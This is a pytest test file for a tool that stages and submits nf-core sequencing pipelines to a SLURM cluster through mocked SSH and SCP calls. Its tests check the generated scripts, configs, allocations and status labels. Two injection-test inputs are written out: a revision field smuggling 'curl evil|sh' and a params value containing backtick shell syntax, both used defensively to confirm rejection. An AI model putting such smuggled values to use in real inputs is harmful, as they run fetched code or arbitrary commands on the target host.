import subprocess

import yaml
from pathlib import Path
import chat_nextseek.luria.submitter as sub

LE = {"user": "alice", "host": "luria.mit.edu", "key": "/k", "working_path": "/net/x"}


def _fixture(tmp_path):
    """A launch.yml + a co-located samplesheet.csv (the submitter's fallback source)."""
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1",
    }]}))
    return tmp_path / "launch.yml", ss


def _raise(*a, **k):
    raise RuntimeError("boom")


def _patch_transport(monkeypatch):
    calls = {"ssh": [], "scp": [], "timeouts": {}}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")

    def fake_ssh(le, cmd, *, key_path, timeout=None):
        calls["ssh"].append(cmd)
        calls["timeouts"][cmd] = timeout
        return "Submitted batch job 4821\n"

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        calls["scp"].append((str(local), remote))
        calls["timeouts"]["scp " + remote] = timeout

    monkeypatch.setattr(sub, "ssh_run", fake_ssh)
    monkeypatch.setattr(sub, "scp_file", fake_scp)
    return calls


def test_submit_luria_happy_path(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    calls = _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env=LE, resources={"cpus": 16})
    assert len(runs) == 1
    ref = runs[0]
    assert ref["job_id"] == "4821"
    assert ref["remote_dir"].startswith("/net/x/runs/nfcore_rnaseq_")
    assert ref["log"].endswith("/nfcore_rnaseq.out")
    assert any(c.startswith("mkdir -p") for c in calls["ssh"])
    assert any("sbatch run.sh" in c for c in calls["ssh"])
    # run.sh + luria.config (-c) + params.yml (-params-file) + samplesheet, then the
    # nessie_status labels and the weekly cleanup script
    remotes = {remote.rsplit("/", 1)[1] for _, remote in calls["scp"]}
    assert remotes == {"run.sh", "luria.config", "params.yml", "samplesheet.csv",
                       "README.txt", "launched.txt", "nessie_cleanup.py"}


def test_submit_luria_stages_state_samplesheet_and_runsh_uses_cli_flags(tmp_path, monkeypatch):
    real_sheet = tmp_path / "my_samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 7\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/samplesheet.csv"):
            staged["sheet_src"] = str(local)
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert len(runs) == 1
    # staged the caller-provided local samplesheet (not a bucket path)
    assert staged["sheet_src"] == str(real_sheet)
    # run.sh drives the run via CLI flags against the staged sheet + the Luria run dir
    assert "--input samplesheet.csv" in staged["run_sh"]
    assert "--genome GRCh38" in staged["run_sh"]
    assert "cd /net/x/runs/nfcore_rnaseq_" in staged["run_sh"]
    assert "/orcd" not in staged["run_sh"]


def test_submit_luria_skips_when_env_incomplete(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env={"user": "u", "key": None, "working_path": "/p", "host": "luria.mit.edu"})
    assert runs == []


def test_submit_luria_missing_launch_returns_empty():
    assert sub.submit_luria("/no/such/launch.yml", luria_env=LE) == []


def test_submit_luria_cleans_run_tmp_on_transport_error(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    created = []
    real_mkstemp = sub.tempfile.mkstemp

    def tracking_mkstemp(*a, **k):
        fd, path = real_mkstemp(*a, **k)
        created.append(path)
        return fd, path

    monkeypatch.setattr(sub.tempfile, "mkstemp", tracking_mkstemp)
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 1\n")
    # scp fails AFTER the run.sh temp file was created + written
    monkeypatch.setattr(sub, "scp_file", _raise)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert runs == []  # entry failed on transport
    import os as _os
    assert created and all(not _os.path.exists(p) for p in created)  # run.sh temp cleaned up


def test_submit_luria_one_bad_entry_does_not_abort_siblings(tmp_path, monkeypatch):
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [
        {"name": "bad"},  # missing pipeline/revision -> skipped
        {"name": "good", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"},
    ]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE)
    assert len(runs) == 1
    assert runs[0]["run_name"] == "good"


def test_submit_luria_skips_entry_with_injected_revision(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample\nA\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "evil", "pipeline": "nf-core/rnaseq", "revision": "x; curl evil|sh"}]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert runs == []  # injected revision -> render raises -> entry skipped, never launched


def test_submit_luria_stages_params_yml_and_luria_config(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 9\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/params.yml"):
            staged["params"] = Path(local).read_text()
        elif remote.endswith("/luria.config"):
            staged["config"] = Path(local).read_text()
        elif remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(
        str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
        genome="GRCm39",
        launch_params={"genome": "GRCm39", "input": "s3://bucket/x", "outdir": "/orcd/out",
                       "aligner": "star_salmon", "gencode": True, "save_reference": True},
    )
    # run.sh wires both generated files in
    assert "-c luria.config" in staged["run_sh"]
    assert "-params-file params.yml" in staged["run_sh"]
    # params.yml carries curated params but NOT the CLI-owned keys (input/outdir/genome)
    params = yaml.safe_load(staged["params"])
    assert params["aligner"] == "star_salmon"
    assert params["gencode"] is True
    assert params["save_reference"] is True
    assert "genome" not in params and "input" not in params and "outdir" not in params
    # luria.config resolved REFS_ROOT under the Luria working path (LE working_path=/net/x)
    assert "/net/x/refs/GRCm39.primary_assembly.genome.fa.gz" in staged["config"]
    assert "{{REFS_ROOT}}" not in staged["config"]


def test_submit_luria_scrnaseq_injects_fasta_gtf_and_knee_config(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "https://github.com/nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 5\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/luria.config"):
            staged["config"] = Path(local).read_text()
        elif remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"protocol": "dropseq"},
                     process_args={"SIMPLEAF_QUANT": "-r cr-like --knee"})
    # run.sh: explicit --fasta/--gtf for Mfas6.0 (LE working_path=/net/x -> /net/x/refs), path > iGenomes
    assert "--fasta /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.dna.toplevel.fa.gz" in staged["run_sh"]
    assert "--gtf /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.116.gtf.gz" in staged["run_sh"]
    # luria.config: genomes map + the SIMPLEAF_QUANT block keeping the base '-r cr-like' + --knee
    assert "'Mfas6.0'" in staged["config"]
    assert "withName: '.*:SIMPLEAF_QUANT'" in staged["config"]
    assert "ext.args = '-r cr-like --knee'" in staged["config"]


def test_submit_luria_scrnaseq_star_runsh_uses_vendored_clone(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "https://github.com/nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 6\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    # aligner=star -> route to the vendored patched clone (LE working_path=/net/x), no -r
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"aligner": "star", "protocol": "dropseq"})
    assert "nextflow run /net/x/pipelines/scrnaseq-2.7.1-star-patched -profile singularity" in staged["run_sh"]
    assert "-r 2.7.1" not in staged["run_sh"]


def test_submit_luria_scrnaseq_alevin_runsh_uses_stock_remote(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_scrnaseq", "pipeline": "nf-core/scrnaseq", "revision": "2.7.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 8\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet),
                     genome="Mfas6.0", launch_params={"aligner": "alevin", "protocol": "dropseq"})
    assert "nextflow run nf-core/scrnaseq -r 2.7.1 -profile singularity" in staged["run_sh"]
    assert "/pipelines/scrnaseq-2.7.1-star-patched" not in staged["run_sh"]


def test_submit_luria_threads_genome_into_runsh(tmp_path, monkeypatch):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 3\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        if remote.endswith("/run.sh"):
            staged["run_sh"] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    # a mouse cohort resolves to GRCm39 — must NOT align to human GRCh38
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE,
                     samplesheet_local=str(real_sheet), genome="GRCm39")
    assert "--genome GRCm39" in staged["run_sh"]
    assert "GRCh38" not in staged["run_sh"]


import csv
from pathlib import Path
import chat_nextseek.luria.submitter as sub


def _write_sheet(path, rows, fields):
    with open(path, "w", newline="") as fh:
        w = csv.DictWriter(fh, fieldnames=fields, lineterminator="\n")
        w.writeheader(); w.writerows(rows)


def _patch_ssh(monkeypatch, scps):
    monkeypatch.setattr(sub, "prepare_key", lambda key: "/tmp/key")
    monkeypatch.setattr(sub, "ssh_run", lambda env, cmd, **kw: "Submitted batch job 42")
    monkeypatch.setattr(sub, "scp_file",
                        lambda env, src, dst, **kw: scps.append((Path(src).name, dst)))


def test_submit_stages_helper_and_sets_needs_fetch_for_srr_sheet(monkeypatch, tmp_path):
    captured = {}
    monkeypatch.setattr(sub, "render_run_script",
                        lambda **kw: captured.update(kw) or "#!/bin/bash\n")
    scps = []
    _patch_ssh(monkeypatch, scps)
    sheet = tmp_path / "samplesheet.csv"
    _write_sheet(sheet, [{"sample": "D.SEQ-2", "accession": "SRR9", "fastq_1": "", "fastq_2": ""}],
                 ["sample", "accession", "fastq_1", "fastq_2"])
    launch = tmp_path / "launch.yml"
    launch.write_text("launch:\n  - {name: r, pipeline: nf-core/rnaseq, revision: 3.18.0}\n")
    env = {"user": "u", "key": "/k", "working_path": "/work", "host": "luria.mit.edu"}
    runs = sub.submit_luria(launch, luria_env=env, samplesheet_local=str(sheet))
    assert runs and runs[0]["job_id"] == "42"
    assert captured["needs_fetch"] is True
    assert captured["fastq_cache"] == "/work/fastq_cache"
    assert any(name == "fetchngs_helpers.py" for name, _ in scps)   # helper staged


def test_submit_no_fetch_for_all_local_sheet(monkeypatch, tmp_path):
    captured = {}
    monkeypatch.setattr(sub, "render_run_script",
                        lambda **kw: captured.update(kw) or "#!/bin/bash\n")
    scps = []
    _patch_ssh(monkeypatch, scps)
    sheet = tmp_path / "samplesheet.csv"
    _write_sheet(sheet, [{"sample": "D.SEQ-1", "accession": "", "fastq_1": "/net/bmc/1.fastq.gz", "fastq_2": ""}],
                 ["sample", "accession", "fastq_1", "fastq_2"])
    launch = tmp_path / "launch.yml"
    launch.write_text("launch:\n  - {name: r, pipeline: nf-core/rnaseq, revision: 3.18.0}\n")
    env = {"user": "u", "key": "/k", "working_path": "/work", "host": "luria.mit.edu"}
    sub.submit_luria(launch, luria_env=env, samplesheet_local=str(sheet))
    assert captured["needs_fetch"] is False
    assert not any(name == "fetchngs_helpers.py" for name, _ in scps)


def test_submit_luria_records_the_launching_user(tmp_path, monkeypatch):
    import NessieAI.ns.reingest.launch_record as lr
    launch, ss = _fixture(tmp_path)
    _patch_transport(monkeypatch)
    recorded = {}
    monkeypatch.setattr(lr, "record_launch", lambda **kw: recorded.update(kw))
    sub.submit_luria(str(launch), luria_env=LE, samplesheet_local=str(ss), user_id=7)
    assert recorded["user_id"] == 7


def _stage(tmp_path, monkeypatch, pipeline, revision, **kw):
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1,fastq_2\nA,a_R1.fq.gz,a_R2.fq.gz\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "run", "pipeline": pipeline, "revision": revision}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path, timeout=None: "Submitted batch job 3\n")

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        staged[remote.rsplit("/", 1)[1]] = Path(local).read_text()

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE,
                     samplesheet_local=str(real_sheet), **kw)
    return staged


def test_submit_rnavar_puts_igenomes_ignore_in_params_yml_as_a_boolean(tmp_path, monkeypatch):
    # The configuration the first real rnavar 1.3.0 run started with after its hand
    # fixes: plain .fa/.gtf, the v2 parser, and igenomes_ignore as a YAML boolean.
    staged = _stage(tmp_path, monkeypatch, "nf-core/rnavar", "1.3.0", genome="GRCh38",
                    launch_params={"genome": "GRCh38", "aligner": "star",
                                   "skip_baserecalibration": True})
    params = yaml.safe_load(staged["params.yml"])
    assert params["igenomes_ignore"] is True
    assert params["skip_baserecalibration"] is True
    assert "genome" not in params
    run_sh = staged["run.sh"]
    assert "export NXF_SYNTAX_PARSER=v2" in run_sh
    assert "--fasta /net/x/refs/GRCh38.primary_assembly.genome.fa " in run_sh
    assert "--gtf /net/x/refs/gencode.v46.basic.annotation.gtf " in run_sh
    assert "--igenomes_ignore" not in run_sh


def test_submit_rnaseq_params_yml_and_runsh_unchanged(tmp_path, monkeypatch):
    staged = _stage(tmp_path, monkeypatch, "nf-core/rnaseq", "3.22.2", genome="GRCh38",
                    launch_params={"genome": "GRCh38", "aligner": "star_salmon"})
    assert yaml.safe_load(staged["params.yml"]) == {"aligner": "star_salmon"}
    run_sh = staged["run.sh"]
    assert "export NXF_SYNTAX_PARSER=v1" in run_sh
    assert ("--fasta /net/x/refs/GRCh38.primary_assembly.genome.fa.gz "
            "--gtf /net/x/refs/gencode.v46.basic.annotation.gtf.gz --igenomes_ignore") in run_sh


def _allocation(staged):
    """(cpus, mem) from run.sh's #SBATCH lines and (cpus, memory) from luria.config's executor."""
    import re
    run_sh, cfg = staged["run.sh"], staged["luria.config"]
    sbatch = (re.search(r"^#SBATCH -n (\d+)$", run_sh, re.M).group(1),
              re.search(r"^#SBATCH --mem=(\S+)$", run_sh, re.M).group(1))
    executor = re.search(r"executor \{\n    cpus = (\d+)\n    memory = '(\d+) GB'\n\}", cfg)
    return sbatch, (executor.group(1), executor.group(2))


def test_submit_default_allocation_matches_between_runsh_and_luria_config(tmp_path, monkeypatch):
    staged = _stage(tmp_path, monkeypatch, "nf-core/rnavar", "1.3.0", genome="GRCh38")
    assert _allocation(staged) == (("16", "128G"), ("16", "120"))
    assert "process.resourceLimits = [cpus: 16, memory: '120 GB']" in staged["luria.config"]


def test_submit_requested_allocation_reaches_both_files(tmp_path, monkeypatch):
    staged = _stage(tmp_path, monkeypatch, "nf-core/rnaseq", "3.22.2", genome="GRCh38",
                    resources={"cpus": 8, "mem": "64G"})
    assert _allocation(staged) == (("8", "64G"), ("8", "60"))


def test_submit_invalid_allocation_falls_back_the_same_in_both_files(tmp_path, monkeypatch):
    staged = _stage(tmp_path, monkeypatch, "nf-core/rnaseq", "3.22.2", genome="GRCh38",
                    resources={"cpus": 999, "mem": "lots"})
    assert _allocation(staged) == (("16", "128G"), ("16", "120"))


def test_submit_executor_block_sits_before_the_process_args(tmp_path, monkeypatch):
    staged = _stage(tmp_path, monkeypatch, "nf-core/scrnaseq", "2.7.1", genome="GRCh38",
                    process_args={"SIMPLEAF_QUANT": "--knee"})
    cfg = staged["luria.config"]
    assert cfg.index("executor {") < cfg.index("withName: '.*:SIMPLEAF_QUANT'")


def test_build_params_yml_refuses_shell_syntax():
    # The params file the Luria node runs from is the last place a steered value can be stopped.
    import pytest
    from chat_nextseek.luria.submitter import _build_params_yml
    with pytest.raises(ValueError, match="multiqc_title"):
        _build_params_yml({"multiqc_title": "`id`", "aligner": "star_salmon"})
    assert "star_salmon" in _build_params_yml({"aligner": "star_salmon", "genome": "GRCm39"})


def _record_transport(monkeypatch, fail_on=None, timeouts=None):
    order, staged = [], {}
    timeouts = {} if timeouts is None else timeouts
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")

    def fake_ssh(le, cmd, *, key_path, timeout=None):
        order.append(cmd)
        timeouts[cmd] = timeout
        return "Submitted batch job 4821\n"

    def fake_scp(le, local, remote, *, key_path, timeout=None):
        timeouts["scp " + remote] = timeout
        if fail_on and fail_on in remote:
            if timeouts.get("raise") == "timeout":
                raise subprocess.TimeoutExpired("scp", timeout)
            raise RuntimeError("scp down")
        order.append("scp " + remote)
        staged[remote.rsplit("/", 1)[1]] = Path(local).read_text()

    monkeypatch.setattr(sub, "ssh_run", fake_ssh)
    monkeypatch.setattr(sub, "scp_file", fake_scp)
    return order, staged


def test_submit_writes_the_status_labels_after_sbatch(tmp_path, monkeypatch):
    launch, _ = _fixture(tmp_path)
    order, staged = _record_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    run_dir = runs[0]["remote_dir"]
    assert order[0] == f"mkdir -p {run_dir}/nessie_status /net/x/work/nfcore_rnaseq"
    sbatch = next(i for i, c in enumerate(order) if "sbatch run.sh" in c)
    assert order.index(f"scp {run_dir}/nessie_status/launched.txt") > sbatch
    assert "slurm_job_id: 4821\n" in staged["launched.txt"]
    assert "work_dir: /net/x/work/nfcore_rnaseq\n" in staged["launched.txt"]
    assert "accessions: \n" in staged["launched.txt"]
    assert "weekly cleanup" in staged["README.txt"]
    assert "mkdir -p /net/x/bin" in order
    assert "scp /net/x/bin/nessie_cleanup.py" in order
    assert staged["nessie_cleanup.py"].startswith("#!/usr/bin/env python3")


def test_submit_records_the_accessions_it_downloads(tmp_path, monkeypatch):
    (tmp_path / "samplesheet.csv").write_text(
        "sample,fastq_1,fastq_2,accession\nA,,,SRR1\nB,,,SRR2\n")
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.16.1"}]}))
    _, staged = _record_transport(monkeypatch)
    sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE)
    assert "accessions: SRR1,SRR2\n" in staged["launched.txt"]
    assert "fetchngs_helpers.py" in staged


def test_a_status_label_failure_never_fails_the_run(tmp_path, monkeypatch):
    launch, _ = _fixture(tmp_path)
    order, _ = _record_transport(monkeypatch, fail_on="/nessie_status/")
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert len(runs) == 1 and runs[0]["job_id"] == "4821"
    # the label writes failing must not stop the cleanup script being staged
    assert "scp /net/x/bin/nessie_cleanup.py" in order


def test_a_failed_readme_does_not_stop_the_script_staging(tmp_path, monkeypatch):
    launch, _ = _fixture(tmp_path)
    order, staged = _record_transport(monkeypatch, fail_on="README.txt")
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert len(runs) == 1
    assert "slurm_job_id: 4821\n" in staged["launched.txt"]
    assert "scp /net/x/bin/nessie_cleanup.py" in order


def test_the_calls_after_sbatch_carry_a_timeout_and_the_ones_before_do_not(tmp_path, monkeypatch):
    launch, _ = _fixture(tmp_path)
    timeouts = {}
    order, _ = _record_transport(monkeypatch, timeouts=timeouts)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    run_dir = runs[0]["remote_dir"]
    assert sub._LABEL_SSH_TIMEOUT_S == 60
    for key in (f"scp {run_dir}/nessie_status/launched.txt",
                f"scp {run_dir}/nessie_status/README.txt",
                "mkdir -p /net/x/bin", "scp /net/x/bin/nessie_cleanup.py"):
        assert timeouts[key] == 60, key
    before = [cmd for cmd in order[:next(i for i, c in enumerate(order) if "sbatch run.sh" in c) + 1]]
    assert all(timeouts[cmd] is None for cmd in before if not cmd.startswith("scp "))
    assert all(v is None for k, v in timeouts.items()
               if k.startswith("scp ") and "nessie_status" not in k and "/bin/" not in k)


def test_a_timeout_on_the_label_scp_still_returns_the_run(tmp_path, monkeypatch):
    launch, _ = _fixture(tmp_path)
    timeouts = {"raise": "timeout"}
    order, _ = _record_transport(monkeypatch, fail_on="/nessie_status/", timeouts=timeouts)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert len(runs) == 1 and runs[0]["job_id"] == "4821"
    assert "scp /net/x/bin/nessie_cleanup.py" in order
